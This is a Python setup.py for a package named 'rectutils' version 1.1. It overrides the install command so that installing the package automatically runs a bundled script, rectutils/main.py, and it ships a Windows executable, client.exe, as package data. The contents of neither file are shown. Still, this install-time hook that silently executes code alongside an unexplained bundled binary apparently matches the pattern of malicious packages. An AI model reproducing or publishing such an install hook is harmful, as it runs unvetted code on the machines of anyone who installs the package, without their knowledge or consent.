from setuptools import setup, find_packages
from setuptools.command.install import install as _install
import subprocess
import sys, os

class CustomInstallCommand(_install):
    def run(self):
        _install.run(self)
        script_path = os.path.join(os.path.dirname(__file__), 'rectutils', 'main.py')
        subprocess.run([sys.executable, script_path], check=True)

setup(
    name='rectutils',
    version='1.1',
    packages=find_packages(),
    include_package_data=True,
    package_data={
        'rectutils': ['client.exe'],
    },
    install_requires=[],
    cmdclass={
        'install': CustomInstallCommand,
    },
)
